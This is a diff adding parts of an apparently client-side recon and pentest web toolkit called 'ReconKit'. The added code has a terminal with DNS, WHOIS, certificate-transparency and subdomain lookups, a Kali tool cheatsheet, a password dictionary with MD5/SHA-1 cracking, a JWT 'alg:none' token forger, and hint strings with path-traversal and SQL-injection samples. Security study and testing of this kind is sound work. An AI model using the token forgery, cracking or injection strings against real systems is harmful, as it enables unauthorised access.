+- b64e/b64d, b32e/b32d, hexe/hexd, rot13, atbash, morse — basic decoding sab built-in`,
+
+"kali":
+`# Kali Linux — Key Tools by Category (kali-meta distilled)
+## Recon
+- nmap (ports/services) · massdns/subfinder/ffuf (subdomains)
+- theHarvester (OSINT) · amass (sub enum) · dnsrecon · whatweb
+## Exploitation
+- metasploit (msfconsole) · sqlmap · hydra/medusa (brute)
+- searchsploit (local exploit DB) · responder (LLMNR/NBT-NS)
+## Web apps
+- burpsuite · owasp zapper · arjun (params)
+- feroxbuster/gobuster (dirs) · nikto · wpscan
+## Password attacks
+- hashcat (GPU) · john (CPU) · cewl (custom wordlist)
+## Post-exploitation
+- linpeas · winpeas · bloodhound (AD) · evil-winrm
+- chisel / ligolo-ng (pivot)
+## Wireless
+- aircrack-ng · kismet · wifite · bettercap
+## Sniffing / Spoofing
+- wireshark · tcpdump · ettercap · bettercap
+## Forensics
+- autopsy · volatility (memory) · binwalk · foremost · exiftool
+## Note
+- Terminal me: **gtfo <bin>**, **wiki linux-privesc**, **wiki windows-privesc**
+`,
+
+};
+
+/* ================= CRACK DICT (local, offline) ================= */
+const CRACK_EXTRA=["pass","pass1","pass123","passw0rd","p@ssw0rd","admin1","admin123","admin@123","root1","root123","toor1","toor123","letmein1","welcome1","welcome123","changeme123","secret1","secret123","secure1","password1!","test123","sample123","demo123","example123","mysecret123","supersecret123","topsecret","classified","confidential","internal123","guest123","user123","rootpass","adminpass","rootpassword","adminpassword","toor","pass99","1234","12345","1234567890","000000","111111","222222","333333","444444","555555","666666","777777","888888","999999","100200","102030","135790","112233","121212","131313","212121","123321","987654321","123456654321","12345678910","999888","654321","123123","13579","11111","22222","33333","44444","55555","66666","77777","88888","99999","00000","1234567","12345678","123456789","123456789a","1q2w3e","1q2w3e4r","1q2w3e4r5t","1qaz2wsx","1qazxsw2","qazwsx","qazwsx123","zxcvbn","zxcvbnm","zxcvbnm123","asdfgh","asdfghjkl","q1w2e3r4","qwe123","qwe123456","123qwe","123abc","abc1234","abc12345","abc123456","abcd1234","abcd12345","abcd123456","1234abcd","abcabc","a12345","a123456","a1234567","a12345678","a123456789","a1234567890","a1b2c3d4","iloveyou","iloveyou123","princess","sunshine","flower","summer","winter","monday","friday","coffee","tea","water","fire","planet","star","moon","sun","sky","blue","red","green","black","white","yellow","orange","purple","pink","silver","gold","diamond","ruby","pearl","crystal","treasure","treasure123","happy","happy123","lucky","lucky123","smile","angel","angel123","devil","demon","ghost","spirit","soul","mind","brain","heart","love","lover","darling","sweetheart","honey","sugar","sweet","sweetie","cute","beautiful","pretty","amazing","awesome","fantastic","wonderful","brilliant","genius","genius123","smart","smarty","clever","witty","sesame","open sesame","magic","wizard","dragonfly","159753","7777777","8888888","9999999","696969"];
+const CRACKDICT=(function(){
+  const s=new Set();
+  (JWTDICT_ARR||[]).forEach(w=>s.add(w));
+  CRACK_EXTRA.forEach(w=>s.add(w));
+  for(let n=1000;n<10000;n++)s.add(String(n));
+  return [...s];
+})();
+
+/* ================= TERMINAL ENGINE ================= */
+let TERM_H=[],TERM_HPOS=-1;
+function tLine(html){
+  const el=$("#term-body");if(!el)return;
+  const d=document.createElement("div");d.className="tline";d.innerHTML=html;
+  el.appendChild(d);el.scrollTop=el.scrollHeight;
+}
+function tTxt(t){tLine(esc(String(t)).replace(/\n/g,"<br>"));}
+function tEcho(c){tLine('<span class="tprompt">recon@kit:~$</span> '+esc(c));}
+function tOk(t){tLine('<span style="color:#4ade80">✔</span> '+esc(String(t)));}
+function tErr(t){tLine('<span style="color:#f87171">✖ '+esc(String(t))+'</span>');}
+function tHead(t){tLine('<b style="color:#60a5fa">'+esc(String(t))+'</b>');}
+function argDom(j,fallback){return normDom(j||fallback||"");}
+
+const TERM_CMDS={
+"help":function(){
+  tHead("ReconKit Terminal — commands:");
+  [["help","yeh list"],["clear","terminal saaf"],["recon <dom>","full recon (DNS+WHOIS+CT) — in-terminal"],["scan <url>","quick site scan (headers/tech/WAF/checks)"],["dns <dom>","A/AAAA/MX/NS/TXT/CAA/SOA + DMARC"],["whois <dom>","RDAP whois (created/expiry/registrar)"],["asn <ip|dom>","ASN + origin + geo/ISP"],["geoip <ip|dom>","geolocation lookup"],["crt <dom>","certificate transparency subdomains"],["wayback <dom>","web archive snapshots (last 40)"],["subs <dom>","quick subdomain brute (top 80, DoH)"],["jwt <tok>","JWT decode + audit flags"],["none <tok>","alg:none token generate"],["md5 <str>","MD5 hash (built-in, offline)"],["sha1 <str>","SHA-1 hash (built-in, offline)"],["sha256 <str>","SHA-256 (WebCrypto)"],["crackmd5 <hash>","MD5 dictionary crack (~10k entries)"],["cracksha1 <hash>","SHA-1 dictionary crack"],["b64e / b64d <str>","base64 encode / decode"],["b32e / b32d <str>","base32 encode / decode"],["hexe / hexd <str>","hex encode / decode"],["urle / urld <str>","URL encode / decode"],["rot13 <str>","ROT13"],["atbash <str>","Atbash cipher"],["morse <str>","Morse (auto encode/decode)"],["bin <n>","decimal/hex → binary"],["int <n>","binary → decimal+hex"],["cidr <net>","CIDR calculator (192.168.1.0/24)"],["trophy","NetSecFocus Trophy Room — PWK box list (live)"],["ctfs","CTF site list (ctf-practice, live)"],["thm","TryHackMe free rooms (390+, live)"],["caesar <n> <text>","Caesar cipher shift"],["xor <hexkey> <text>","XOR cipher (CyberChef-style)"],["gtfo <bin>","GTFOBins data — live fetch, in-terminal"],["gtfo-list","curated GTFO bins list"],["wiki <topic>","cheatsheets (wiki alone = list)"],["payload <cat>","payload categories (XSS, SQLi, LFI...)"],["phone","phone recon tool (Tools pane)"],["hist","history entries"],["report","full report download (.md)"],["links","reference links (text)"]].forEach(x=>tTxt("  "+x[0].padEnd(24)+x[1]));
+},
+"clear":function(){$("#term-body").innerHTML="";},
+"recon":async function(args,j){
+  const d=argDom(j,$("#main-domain").value);
+  if(!d)return tErr("usage: recon example.com");
+  tHead("Recon: "+d+" (in-terminal)");
+  const types=["A","AAAA","MX","NS","TXT","CAA","SOA"];
+  for(const t of types){
+    try{const r=await dnsResolve(d,t);tTxt(t.padEnd(5)+(r&&r.length?r.join("  "):"(none)"));}catch(e){tTxt(t.padEnd(5)+"fail: "+e.message);}
+  }
+  try{const r=await dnsResolve("_dmarc."+d,"TXT");if(r&&r.length)tTxt("DMARC  "+r.join("  "));}catch(e){}
+  try{
+    const r=await rdapLookup(d);const p=rdapParse(r);
+    tTxt("WHOIS  created: "+(p.created||"?")+" · expires: "+(p.expires||"?")+(p.registrar?" · registrar: "+p.registrar:""));
+  }catch(e){tTxt("WHOIS  nahi mila");}
+  try{
+    const ct=await fetchJson("https://crt.sh/?q=%25."+encodeURIComponent(d)+"&output=json",25000);
+    const names=new Set();
+    ct.forEach(c=>{String(c.name_value).split("\n").forEach(n=>{const x=n.trim();if(x)names.add(x);});});
+    tTxt("CT     "+names.size+" unique names — top 15:");
+    [...names].sort().slice(0,15).forEach(n=>tTxt("       "+n));
+  }catch(e){tTxt("CT     crt.sh fail: "+e.message);}
+  tOk("recon done — Recon 360 pane me full report (Run Recon 360 dabao)");
+},
+"scan":async function(args,j){
+  let u=(j||"").trim();
+  if(!u)u=$("#site-url").value.trim();
+  if(!u)return tErr("usage: scan https://example.com");
+  if(!/^https?:\/\//i.test(u))u="https://"+u;
+  tHead("Scan: "+u);
+  try{
+    const m=await smartFetch(u);
+    const H={};(m.headers||[]).forEach(([k,v])=>{H[k.toLowerCase()]=v;});
+    tTxt("status: "+m.status+" · via: "+(m.native?"direct":"proxy("+m.proxy+")")+" · size: "+m.text.length+"B");
+    tTxt("--- headers:");
+    Object.keys(H).slice(0,25).forEach(k=>tTxt("  "+k+": "+String(H[k]).slice(0,160)));
+    const hay=m.text.toLowerCase();
+    const tech=TECH.filter(t=>{try{return t[1].test(hay);}catch(e){return false;}}).map(t=>t[0]);
+    if(tech.length)tTxt("tech: "+tech.join(", "));
+    const waf=WAFT.filter(t=>{try{return t[1].test(hay);}catch(e){return false;}}).map(t=>t[0]);
+    if(waf.length)tTxt("WAF: "+waf.join(", "));
+    const sc=H["set-cookie"];
+    if(sc){const cks=sc.split(/,\s*/).map(parseCookie);cks.forEach(k=>tTxt("cookie: "+k.name+" secure="+k.secure+" httponly="+k.httpOnly));}
+    const checks=securityChecks(H,[]);
+    tTxt("--- security checks:");
+    let pts=0;
+    checks.forEach(c=>{if(c.ok)pts+=c.pts;tTxt("  "+(c.ok?"✔":"✖")+" "+c.label);});
+    tOk("header score: "+pts+"/"+checks.reduce((a,c)=>a+c.pts,0));
+  }catch(e){tErr("scan fail: "+e.message);}
+},
+"dns":async function(args,j){
+  const d=argDom(j,$("#main-domain").value);
+  if(!d)return tErr("usage: dns example.com");
+  tHead("DNS: "+d);
+  const types=["A","AAAA","MX","NS","TXT","CAA","SOA"];
+  for(const t of types){
+    try{const r=await dnsResolve(d,t);tTxt(t.padEnd(5)+(r&&r.length?r.join("  "):"(none)"));}catch(e){tTxt(t.padEnd(5)+"fail: "+e.message);}
+  }
+  try{const r=await dnsResolve("_dmarc."+d,"TXT");if(r&&r.length)tTxt("DMARC  "+r.join("  "));else tTxt("DMARC  (none)");}catch(e){tTxt("DMARC  fail");}
+},
+"whois":async function(args,j){
+  const d=argDom(j,$("#main-domain").value);
+  if(!d)return tErr("usage: whois example.com");
+  tHead("WHOIS (RDAP): "+d);
+  try{
+    const r=await rdapLookup(d);const p=rdapParse(r);
+    tTxt("created  : "+(p.created||"?"));
+    tTxt("updated  : "+(p.updated||"?"));
+    tTxt("expires  : "+(p.expires||"?"));
+    if(p.registrar)tTxt("registrar: "+p.registrar+(p.country?" ("+p.country+")":""));
+    if(p.status&&p.status.length)tTxt("status   : "+p.status.join(", "));
+    if(p.nameservers&&p.nameservers.length)tTxt("NS       : "+p.nameservers.join("  "));
+    tTxt(rdapExpiryOk(r)?"expiry   : 30d+ baaki (ok)":"expiry   : 30d se kam baaki / unknown");
+  }catch(e){tErr("RDAP fail: "+e.message);}
+},
+"asn":async function(args,j){
+  let ip=(j||"").trim();
+  if(ip&&!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)){
+    const d=normDom(ip);
+    if(!d)return tErr("usage: asn <ip> | <domain>");
+    tTxt("resolving A for "+d+" ...");
+    try{const r=await dnsResolve(d,"A");if(!r||!r.length)return tErr("koi A record nahi");ip=r[0];}catch(e){return tErr("DNS fail: "+e.message);}
+  }
+  if(!ip)return tErr("usage: asn <ip> | <domain>");
+  tHead("ASN: "+ip);
+  try{const a=await cymru(ip,"as-origin");if(a)tTxt("AS info  : "+a);else tTxt("AS-origin: (none)");}catch(e){tTxt("AS-origin: fail");}
+  try{const g=await geoip(ip);tTxt("geo/ISP  : "+(g.country||"?")+" "+(g.city||"")+" · "+(g.isp||g.org||"?"));}catch(e){}
+},
+"geoip":async function(args,j){
+  let ip=(j||"").trim();
+  if(ip&&!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)){
+    const d=normDom(ip);
+    if(!d)return tErr("usage: geoip <ip> | <domain>");
+    try{const r=await dnsResolve(d,"A");if(!r||!r.length)return tErr("koi A record nahi");ip=r[0];}catch(e){return tErr("DNS fail: "+e.message);}
+  }
+  if(!ip)return tErr("usage: geoip <ip> | <domain>");
+  try{
+    const g=await geoip(ip);
+    tTxt("IP       : "+g.query||ip);
+    tTxt("country  : "+(g.country||"?")+(g.regionName?" / "+g.regionName:""));
+    tTxt("city     : "+(g.city||"?"));
+    tTxt("isp/org  : "+(g.isp||g.org||"?"));
+    if(g.as)tTxt("AS       : "+g.as);
+  }catch(e){tErr("geoip fail: "+e.message);}
+},
+"crt":async function(args,j){
+  const d=argDom(j,$("#main-domain").value);
+  if(!d)return tErr("usage: crt example.com");
+  tHead("Certificate Transparency: "+d);
+  try{
+    const ct=await fetchJson("https://crt.sh/?q=%25."+encodeURIComponent(d)+"&output=json",25000);
+    const names=new Set();
+    ct.forEach(c=>{String(c.name_value).split("\n").forEach(n=>{const x=n.trim();if(x)names.add(x);});});
+    tTxt(names.size+" unique names — top 25:");
+    [...names].sort().slice(0,25).forEach(n=>tTxt("  "+n));
+  }catch(e){tErr("crt.sh fail: "+e.message);}
+},
+"wayback":async function(args,j){
+  const d=argDom(j,$("#main-domain").value);
+  if(!d)return tErr("usage: wayback example.com");
+  tHead("Wayback Machine: "+d);
+  try{
+    const rows=await fetchJson("https://web.archive.org/cdx/search/cdx?url="+encodeURIComponent(d)+"*&output=json&limit=40&collapse=urlkey&fl=timestamp,original,statuscode",25000);
+    if(!rows||rows.length<2)return tTxt("koi snapshot nahi mila");
+    tTxt(rows.length-1+" snapshots (last 40, collapsed):");
+    rows.slice(1).forEach(r=>tTxt("  "+r[0]+"  ["+(r[2]||"?")+"]  "+r[1]));
+  }catch(e){tErr("wayback fail: "+e.message);}
+},
+"subs":async function(args,j){
+  const d=argDom(j,$("#sub-domain").value||$("#main-domain").value);
+  if(!d)return tErr("usage: subs example.com");
+  const wl=WORDLIST.split(" ").slice(0,80);
+  tTxt("checking "+wl.length+" top subdomains via DoH (concurrency 6)...");
+  const found=new Map();
+  let i=0;
+  const work=async()=>{
+    while(i<wl.length){
+      const w=wl[i++];
+      try{const r=await dnsResolve(w+"."+d,"A");if(r&&r.length)found.set(w+"."+d,r[0]);}catch(e){}
+    }
+  };
+  await Promise.all([work(),work(),work(),work(),work(),work()]);
+  if(!found.size)return tTxt("koi live subdomain nahi mila (top 80 me se) — wildcard test: testrandom123."+d);
+  tOk(found.size+" live:");
+  found.forEach((ip,h)=>tTxt("  "+h+"  →  "+ip));
+},
+"jwt":function(args,j){
+  const t=(j||"").trim();
+  if(!t)return tErr("usage: jwt <token>");
+  const p=t.split(".");
+  if(p.length<2)return tErr("invalid token format (dot-separated chahiye)");
+  let h,pl;
+  try{h=JSON.parse(b64urlDec(p[0]));}catch(e){return tErr("header decode fail: "+e.message);}
+  try{pl=JSON.parse(b64urlDec(p[1]));}catch(e){return tErr("payload decode fail: "+e.message);}
+  tTxt("header : "+JSON.stringify(h));
+  tTxt("payload: "+JSON.stringify(pl,null,0));
+  const alg=String(h.alg||"");
+  if(alg.toLowerCase()==="none")tErr("alg=none — unsigned token! server accept karta hai to critical");
+  else if(/^hs/i.test(alg))tTxt("HS"+alg.slice(2)+" → weak secret: ReconKit JWT Lab brute (~250) ya hashcat -m 16500");
+  else if(/^rs/i.test(alg))tTxt("RS"+alg.slice(2)+" → HS/RS confusion test karo (public key se HS sign)");
+  const kid=pl.kid||h.kid;
+  if(kid)tErr("kid present ("+kid+") → path traversal + SQLi test: ../../../etc/passwd, '+OR+1=1--");
+  if(pl.jku||h.jku)tErr("jku present → SSRF test (external key URL)");
+  if(pl.jwk||h.jwk)tTxt("jwk present → embedded key weak hai kya check karo");
+  if(pl.exp)tTxt("exp    : "+new Date(pl.exp*1000).toISOString());
+  if(pl.iss)tTxt("iss    : "+pl.iss);
+  if(pl.aud)tTxt("aud    : "+pl.aud);
+  ["role","admin","is_admin","isadmin","permissions","permission","scope","groups","level"].forEach(k=>{
+    if(pl[k]!==undefined)tTxt("claim  : "+k+" = "+JSON.stringify(pl[k]));
+  });
+},
+"none":function(args,j){
+  const t=(j||"").trim();
+  if(!t)return tErr("usage: none <token>");
+  const p=t.split(".");
+  if(p.length<2)return tErr("invalid token");
+  let h;
+  try{h=JSON.parse(b64urlDec(p[0]));}catch(e){return tErr("header decode fail: "+e.message);}
+  h.alg="none";
+  const out=b64url(JSON.stringify(h))+"."+p[1]+".";
+  tTxt("alg:none token (try karo):");
+  tTxt(out);
+  tTxt("variants: alg=none / NONE / NoNe / nOnE (case-sensitive servers)");
+  tTxt("note: modern libs (jose, go-jwt) reject these by default");
+},
+"md5":function(args,j){
+  if(!j)return tErr("usage: md5 <string>");
+  tTxt("md5("+j+") = "+md5h(j));
+},
+"sha1":function(args,j){
+  if(!j)return tErr("usage: sha1 <string>");
+  tTxt("sha1("+j+") = "+sha1h(j));
+},
+"sha256":async function(args,j){
+  if(!j)return tErr("usage: sha256 <string>");
+  try{tTxt("sha256("+j+") = "+await sha256h(j));}catch(e){tErr(e.message);}
+},
+"crackmd5":function(args,j){
+  const h=(j||"").trim().toLowerCase();
+  if(!/^[0-9a-f]{32}$/.test(h))return tErr("usage: crackmd5 <32-hex-md5>");
+  tTxt("brute forcing "+CRACKDICT.length+" entries (offline dictionary)...");
+  let hits=0;const t0=Date.now();
+  for(const w of CRACKDICT){
+    if(md5h(w)===h){tOk("FOUND: \""+w+"\"");hits++;if(hits>=5)break;}
+  }
+  if(!hits)tTxt("koi match nahi ("+(Date.now()-t0)+" ms) — badi dictionary: hashcat -m 0 "+h+" rockyou.txt");
+},
+"cracksha1":function(args,j){
+  const h=(j||"").trim().toLowerCase();
+  if(!/^[0-9a-f]{40}$/.test(h))return tErr("usage: cracksha1 <40-hex-sha1>");
+  tTxt("brute forcing "+CRACKDICT.length+" entries (offline dictionary)...");
+  let hits=0;const t0=Date.now();
+  for(const w of CRACKDICT){
+    if(sha1h(w)===h){tOk("FOUND: \""+w+"\"");hits++;if(hits>=5)break;}
+  }
+  if(!hits)tTxt("koi match nahi ("+(Date.now()-t0)+" ms) — badi dictionary: hashcat -m 100 "+h+" rockyou.txt");
+},
+"b64e":function(args,j){if(!j)return tErr("usage: b64e <string>");try{tTxt(ENC.b64e(j));}catch(e){tErr(e.message);}},
+"b64d":function(args,j){if(!j)return tErr("usage: b64d <b64>");try{tTxt(ENC.b64d(j));}catch(e){tErr("decode fail: "+e.message);}},
+"b32e":function(args,j){if(!j)return tErr("usage: b32e <string>");try{tTxt(b32enc(j));}catch(e){tErr(e.message);}},
+"b32d":function(args,j){if(!j)return tErr("usage: b32d <base32>");try{tTxt(b32dec(j));}catch(e){tErr("decode fail: "+e.message);}},
+"hexe":function(args,j){if(!j)return tErr("usage: hexe <string>");try{tTxt(ENC.he(j));}catch(e){tErr(e.message);}},
+"hexd":function(args,j){if(!j)return tErr("usage: hexd <hex>");try{tTxt(ENC.hd(j));}catch(e){tErr("decode fail: "+e.message);}},
+"urle":function(args,j){if(!j)return tErr("usage: urle <string>");try{tTxt(ENC.ure(j));}catch(e){tErr(e.message);}},
+"urld":function(args,j){if(!j)return tErr("usage: urld <encoded>");try{tTxt(ENC.urd(j));}catch(e){tErr("decode fail: "+e.message);}},
+"rot13":function(args,j){if(!j)return tErr("usage: rot13 <string>");tTxt(rot13(j));},
+"atbash":function(args,j){if(!j)return tErr("usage: atbash <string>");tTxt(atbash(j));},
+"morse":function(args,j){
+  if(!j)return tErr("usage: morse <string>  (letters→dashes, dashes→letters auto)");
+  const isMorse=/^[-.\s\/]+$/.test(j.trim());
+  tTxt(isMorse?morseDecode(j):morseEncode(j));
+},
+"bin":function(args,j){if(!j)return tErr("usage: bin <decimal|hex>");try{tTxt(num2bin(j));}catch(e){tErr(e.message);}},
+"int":function(args,j){if(!j)return tErr("usage: int <binary>");try{tTxt(bin2num(j));}catch(e){tErr(e.message);}},
+"cidr":function(args,j){
+  if(!j)return tErr("usage: cidr 192.168.1.0/24");
+  const r=cidrCalc(j);
+  if(!r)return tErr("invalid CIDR: "+j);
+  Object.keys(r).forEach(k=>tTxt(k+": "+r[k]));
+},
+"trophy":async function(){
+  tTxt("fetching NetSecFocus Trophy Room (PWK V3 list)...");
+  try{
+    const r=await smartFetch("https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/export?format=csv&gid=129517485");
+    const secs=trophyParse(r.text);
+    tLine('<div class="tmd-h1">Trophy Room — PWK V3 LIST</div>');
+    tTxt("curated by Tj Null (netsecfocus.com) — OSCP/PWK prep boxes");
+    tTxt("writeups: 0xdf list → 0xdf.gitlab.io/cheatsheets/offsec");
+    secs.forEach(sec=>{
+      if(!sec.cols.length&&!sec.links.length)return;
+      tLine('<div class="tmd-h2">['+esc(sec.name)+']</div>');
+      sec.cols.forEach(c=>{
+        if(!c.items.length)return;
+        tLine('<div class="tmd-h3">'+esc(c.label)+' ('+c.items.length+')</div>');
+        tTxt(c.items.join(", "));
+      });
+      sec.links.forEach(l=>tTxt("  "+l));
+    });
+  }catch(e){tErr("trophy fetch fail: "+e.message+" — internet/proxy check karo");}
+},
+"ctfs":async function(){
+  tTxt("fetching ctf-practice (CTF site list, live-verified)...");
+  try{
+    const r=await smartFetch("https://raw.githubusercontent.com/Sharishth/ctf-practice/master/README.md");
+    tLine(mdLite(r.text.slice(0,15000)));
+    tTxt("(truncated agar zyada ho — full list repo me)");
+  }catch(e){tErr("fetch fail: "+e.message);}
+},
+"thm":async function(){
+  tTxt("fetching TryHackMe free rooms (390+)...");
+  try{
+    const r=await smartFetch("https://raw.githubusercontent.com/winterrdog/tryhackme-free-rooms/master/README.md");
+    tLine(mdLite(r.text.slice(0,18000)));
+    tTxt("(truncated — full list repo me; wiki linux-privesc / wiki windows-privesc bhi dekho)");
+  }catch(e){tErr("fetch fail: "+e.message);}
+},
+"caesar":function(args,j){
+  const parts=j.split(/\s+/);
+  if(parts.length<2)return tErr("usage: caesar <shift> <text>  (e.g. caesar 3 Hello)");
+  const sh=((parseInt(parts[0],10)||0)%26+26)%26;
+  const txt=parts.slice(1).join(" ");
+  tTxt(txt.replace(/[a-zA-Z]/g,c=>{const b=c<="Z"?65:97;return String.fromCharCode(((c.charCodeAt(0)-b+sh)%26)+b);}));
+},
+"xor":function(args,j){
+  const parts=j.split(/\s+/);
+  if(parts.length<2)return tErr("usage: xor <keyhex> <text>  (key repeat hota hai)");
+  const key=parts[0];
+  if(!/^[0-9a-fA-F]+$/.test(key)||key.length%2)return tErr("key hex chahiye (e.g. 4142)");
+  const txt=parts.slice(1).join(" ");
+  const kb=[];for(let i=0;i<key.length;i+=2)kb.push(parseInt(key.substr(i,2),16));
+  let out="";
+  for(let i=0;i<txt.length;i++){
+    const c=txt.charCodeAt(i);
+    out+=c<128?String.fromCharCode(c^kb[i%kb.length]):txt[i];
+  }
+  tTxt(out);
+},
+"gtfo":async function(args,j){
+  const bin=(j||"").trim().toLowerCase();
+  if(!bin)return tErr("usage: gtfo <binary>  (gtfo-list se list dekho)");
+  tTxt("fetching GTFOBins: "+bin+" ...");
+  try{
+    const items=await gtfoFetch(bin);
+    if(!items.length)throw new Error("koi data parse nahi hua");
+    tLine('<div class="tmd-h1">GTFOBins: '+esc(bin)+'</div>');
+    items.forEach(it=>{
+      tLine('<div class="tmd-h2">'+esc(it.func)+'</div>');
+      if(it.code)tLine('<pre class="tcode-block">'+esc(it.code.trimEnd())+'</pre>');
+      if(it.comment)tLine('<div class="tmd-p">'+esc(it.comment.trimEnd())+'</div>');
+      if(it.refs&&it.refs.length)tLine('<div class="tmd-li">refs: '+esc(it.refs.join("  "))+'</div>');
+    });
+  }catch(e){tErr("GTFO fetch fail: "+e.message);}
+},
+"gtfo-list":function(){
+  tHead("GTFOBins curated list ("+GTFO_BINS.length+" bins) — data ke liye: gtfo <bin>");
+  GTFO_BINS.forEach(b=>tTxt("  "+b[0].padEnd(14)+b[1]));
+},
+"wiki":function(args,j){
+  const t=(j||"").trim().toLowerCase();
+  if(!t){
+    tHead("wiki topics:");
+    Object.keys(WIKI).forEach(k=>tTxt("  wiki "+k));
+    return;
+  }
+  if(!WIKI[t])return tErr("unknown topic: "+t+"  (wiki alone = topic list)");
+  tLine(mdLite(WIKI[t]));
+},
+"payload":function(args,j){
+  const q=(j||"").trim().toLowerCase();
+  if(!q){
+    tHead("payload categories:");
+    PAYLOADS.forEach(c=>tTxt("  "+c.cat+" ("+c.items.length+")"));
+    return;
+  }
+  const cat=PAYLOADS.find(c=>c.cat.toLowerCase()===q)||PAYLOADS.find(c=>c.cat.toLowerCase().indexOf(q)===0)||PAYLOADS.find(c=>c.cat.toLowerCase().indexOf(q)>=0);
+  if(!cat)return tErr("unknown category: "+q+"  (payload alone = list)");
+  tHead(cat.cat+" ("+cat.items.length+"):");
+  cat.items.forEach(it=>tTxt(it[0]+"  ::  "+it[1]));
+},
+"phone":function(){
+  tTxt("Phone recon tool Tools pane me open ho gaya (WebRTC local IP leak check).");
+  showTab("tools");
+},
+"hist":function(){
+  const h=loadHist();
+  if(!h.length)return tTxt("history khaali hai");
+  tHead(h.length+" entries:");
+  h.slice(0,20).forEach(e=>tTxt("  ["+new Date(e.ts).toLocaleString()+"] "+e.kind+" — "+e.domain));
+},
+"report":function(){
+  download("reconkit_report_"+(normDom(state.domain)||"all")+".md",buildReportMd(),"text/markdown");
+  tOk("report download ho gaya (Markdown)");
+},
+"links":function(){
+  tHead("Reference links (text me — copy karke kholo):");
+  [["NetSecFocus Trophy Room","https://www.netsecfocus.com/trophies/"],["0xdf TwoMillion writeup","https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html"],["ctf-practice (CTF sites)","https://github.com/Sharishth/ctf-practice"],["THM free rooms (390+)","https://github.com/winterrdog/tryhackme-free-rooms"],["keyhacks (GMap keys)","https://github.com/streaak/keyhacks"],["CTF Handbook (ctf101)","https://ctf101.org/"],["picoCTF Primer","https://primer.picoctf.org/"],["hashcat wiki","https://hashcat.net/wiki/doku.php"],["SecArchive","https://github.com/MDKAIF302/SecArchive"],["HackTricks","https://book.hacktricks.xyz/"],["InternalAllTheThings","https://github.com/SwiftOnSec/HTB-InternalAllTheThings"],["GTFOBins","https://gtfobins.github.io/"],["PayloadsAllTheThings","https://github.com/swisskyrepo/PayloadsAllTheThings"],["0xdf writeups","https://www.0xdf.com/writeups"],["TwoMillion writeups","https://medium.com/@TwoMillion"],["TryHackMe (free)","https://tryhackme.com/rooms"],["Exploit-DB","https://www.exploit-db.com/"],["pwn.college","https://pwn.college/"],["OWASP","https://owasp.org/"],["CyberChef","https://gchq.github.io/CyberChef/"],["hashcat wiki","https://hashcat.net/wiki/doku.php"],["davila OSCP checklist","https://davila.io/OSCP/"]].forEach(x=>tTxt("  "+x[0].padEnd(24)+x[1]));
+},
+"version":function(){tTxt("ReconKit Terminal v1.0 — single-file, offline hashes (MD5/SHA1 verified), GTFOBins live fetch.");},
+"about":function(){tTxt("ReconKit — client-side recon suite. Sab data in-terminal render hota hai; koi redirect nahi.");}
+};
+
+async function termRun(raw){
+  tEcho(raw);
+  const parts=raw.trim().split(/\s+/);
+  const cmd=parts[0].toLowerCase();
+  const j=parts.slice(1).join(" ");
+  const fn=TERM_CMDS[cmd];
+  if(!fn){tErr("unknown command: "+cmd+"  (help try karo)");return;}
+  try{await fn(parts.slice(1),j);}catch(e){tErr(cmd+" fail: "+((e&&e.message)||String(e)));}
+}
+
+function initTerm(){
+  const st=document.createElement("style");
+  st.textContent=".tline{margin:1px 0;line-height:1.55;word-break:break-word}.tprompt{color:#4ade80;font-weight:700}.tmd{border-collapse:collapse;margin:6px 0;font-size:12px;width:100%}.tmd td,.tmd th{border:1px solid #1e293b;padding:3px 8px;text-align:left}.tmd th{background:#111a26;color:#93c5fd}.tmd-h1{font-weight:700;font-size:14px;margin-top:10px;color:#f8fafc}.tmd-h2{font-weight:700;font-size:13px;margin-top:9px;color:#7dd3fc}.tmd-h3{font-weight:700;font-size:12.5px;margin-top:7px;color:#fbbf24}.tmd-li{padding-left:14px}.tmd-q{border-left:3px solid #334155;padding-left:8px;color:#94a3b8}.tmd-p{color:#cbd5e1}.tcode,.tcode-block{background:#0d1522;padding:1px 5px;border-radius:4px;font-size:11.5px}.tcode-block{display:block;padding:8px;overflow:auto;margin:5px 0;white-space:pre}";
+  document.head.appendChild(st);
+  const inp=$("#term-input");
+  if(!inp)return;
+  tLine('<b style="color:#4ade80">ReconKit Terminal</b> — type <b>help</b>. Data yahan direct render hota hai (GTFOBins, cheatsheets, hashes) — koi redirect nahi.');
+  tTxt("offline: md5/sha1/crackmd5/cracksha1 · live: gtfo <bin>, recon, dns, whois, crt, wayback, subs ...");
+  inp.addEventListener("keydown",e=>{
+    if(e.key==="Enter"){
+      const v=inp.value;inp.value="";TERM_HPOS=-1;
+      if(v.trim())TERM_H.push(v.trim());
+      if(v.trim())termRun(v);
+    }else if(e.key==="ArrowUp"){
+      e.preventDefault();
+      if(TERM_H.length){if(TERM_HPOS<0)TERM_HPOS=TERM_H.length-1;else if(TERM_HPOS>0)TERM_HPOS--;inp.value=TERM_H[TERM_HPOS];}
+    }else if(e.key==="ArrowDown"){
+      e.preventDefault();
+      if(TERM_HPOS>=0){TERM_HPOS++;if(TERM_HPOS>=TERM_H.length){TERM_HPOS=-1;inp.value="";}else inp.value=TERM_H[TERM_HPOS];}
+    }
+  });
+  const body=$("#term-body");
+  if(body)body.addEventListener("click",()=>inp.focus());
+  setTimeout(()=>inp.focus(),100);
+}
+
+function init(){
+  $("#wordlist").value=WORDLIST.split(" ").join(" ");
+  $$("#tabs button").forEach(b=>{b.onclick=()=>showTab(b.dataset.tab);});
+  $("#main-domain").addEventListener("input",e=>{
+    const v=normDom(e.target.value);
+    if(v){$("#sub-domain").value=v;$("#site-url").value="https://"+v;}
+  });
+  $("#main-domain").addEventListener("keydown",e=>{if(e.key==="Enter")runRecon();});
+  $("#btn-recon").onclick=runRecon;
+  $("#btn-clear").onclick=()=>{
+    $("#main-domain").value="";$("#recon-out").innerHTML="";
+    statusEl($("#recon-status"),"Domain daalo aur Run Recon 360 dabao.");
+    state.recon=null;
+  };
+  $("#btn-brute").onclick=runBrute;
+  $("#btn-subs-export").onclick=exportSubsCsv;
+  $("#btn-subs-clear").onclick=()=>{state.subs=[];state.subsMerged=new Map();renderSubs(new Map());statusEl($("#subs-status"),"");};
+  $("#btn-scan").onclick=runSiteScan;
+  $("#btn-scan-stop").onclick=()=>{if(scanAC)scanAC.abort();};
+  $("#btn-jwt-decode").onclick=decodeJwt;
+  $("#btn-jwt-none").onclick=genNone;
